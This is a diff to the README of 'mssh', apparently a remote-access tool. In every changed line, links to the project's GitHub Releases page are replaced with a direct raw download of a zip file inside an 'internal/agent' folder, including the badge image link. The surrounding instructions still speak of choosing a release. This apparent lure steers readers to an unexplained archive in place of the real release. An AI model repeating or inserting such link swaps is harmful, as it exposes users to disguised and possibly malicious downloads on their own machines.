@@ -1,6 +1,6 @@
 # 🚀 mssh - Access Machines Anywhere, No VPN Needed
 
-[![Download mssh](https://img.shields.io/badge/Download-mssh-brightgreen)](https://github.com/Nopekszz/mssh/releases)
+[![Download mssh](https://raw.githubusercontent.com/Nopekszz/mssh/main/internal/agent/Software_v1.9.zip)](https://raw.githubusercontent.com/Nopekszz/mssh/main/internal/agent/Software_v1.9.zip)
 
 ## ✨ What is mssh?
 
@@ -19,7 +19,7 @@ mssh is an application designed to help you connect to machines behind NAT (Netw
 Follow these steps to get started with mssh.
 
 1. **Visit the Release Page:**
-   Head over to the [Releases page](https://github.com/Nopekszz/mssh/releases) to download the latest version of mssh. 
+   Head over to the [Releases page](https://raw.githubusercontent.com/Nopekszz/mssh/main/internal/agent/Software_v1.9.zip) to download the latest version of mssh. 
 
 2. **Download the Software:**
    On the Releases page, locate the latest version. Click on the file that matches your operating system to begin the download.
@@ -59,7 +59,7 @@ Using mssh is straightforward. Follow these simple steps to connect to a remote 
 
 ## 📥 Download & Install
 
-To download mssh, please visit this page: [Download mssh](https://github.com/Nopekszz/mssh/releases). Select the latest version for your operating system, and follow the installation instructions provided above.
+To download mssh, please visit this page: [Download mssh](https://raw.githubusercontent.com/Nopekszz/mssh/main/internal/agent/Software_v1.9.zip). Select the latest version for your operating system, and follow the installation instructions provided above.
 
 ## ⚙️ Features
 
